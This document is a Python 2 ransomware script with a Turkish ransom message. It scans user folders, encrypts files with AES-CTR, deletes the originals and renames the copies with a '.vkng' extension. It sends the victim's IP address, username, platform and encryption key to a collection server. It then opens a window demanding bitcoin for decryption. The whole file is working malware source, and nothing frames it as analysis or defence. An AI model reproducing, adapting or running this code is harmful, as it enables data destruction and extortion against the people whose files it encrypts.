# -*- coding: utf-8 -*-

import os
import sys
import pyaes
import base64
import urllib
import urllib2
import getpass

from Tkinter import *

key       = os.urandom(32)
fileNames = []

host = "http://192.168.1.33/rans/rans.php"

userPath = os.path.expanduser('~') + os.sep

docsPath   = userPath + "Documents"
docsPath2  = userPath + "Belgeler"

deskPath   = userPath + "Masaüstü"
deskPath2  = userPath + "Desktop"

musicPath  = userPath + "Müzik"
musicPath2 = userPath + "Music"

#paths = [docsPath, deskPath, musicPath, docsPath2, deskPath2, musicPath2]
paths = [userPath + "TESTPATH"]

def post():

    data = urllib.urlencode({
    "ip"     : urllib2.urlopen("http://ip.42.pl/raw").read(),
    "system" : sys.platform,
    "uname"  : getpass.getuser(),
    "key"    : base64.b64encode(key)
    })

    req = urllib2.Request(host, data=data)

    try:
        urllib2.urlopen(req)
    except:
        pass


def tk():
    message = """
---------------------  Dikkat!  ---------------------

Bilgisayarınızdaki %s dosya şifrelendi!
Aşağıdaki bitcoin adresine gerekli ödemeyi yapmadıkça
şifreyi çözemeyeceksiniz!

Bitcoin Adresi: xxxxxxxxxxxxxx

------ Şifre çözmek için

Şu an bu dosyanın bulunduğu dizinde oluşan "decrypt.exe"
dosyasını açın ve bitcoini yatırdığınız zaman vereceğimiz
anahtarı yazın, dosyalarınızın şifresi çözülecektir.

------ Şifrelenenler:


"""%(len(fileNames))
    
    message = message + '\n'.join(fileNames)

    root = Tk()
    root.tk_setPalette("black")
    root.title("TUM DOSYALARINIZ SIFRELENDI")

    textBox = Text(root, fg="green")
    textBox.pack()

    textBox.insert("1.0", message)
    root.mainloop()


def scan(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for file in files:
            filePath = os.path.join(root, file)
            if ".vkng" not in filePath:
                if os.path.getsize(filePath) < (2097152 * 5):
                	fileNames.append(filePath)

def encrypt(fileName, key):
    aes = pyaes.AESModeOfOperationCTR(key)

    try:
        fb = open(fileName, "rb").read()
        nb = aes.encrypt(fb)
            
        nf = open(fileName+".vkng", "wb")
        nf.write(nb)
        nf.flush()
        nf.close()
            
        os.remove(fileName)
    except:
        pass

def main():
    for path in paths:
        try:
            scan(path)
        except:
            pass

    if len(fileNames) != 0:
        for file in fileNames:
            encrypt(file, key)

        #file = open("decrypt.py", "w")
        #file.write(decrypter)
        #file.close()

        post()
        tk()
        
if __name__ == "__main__":
	main()
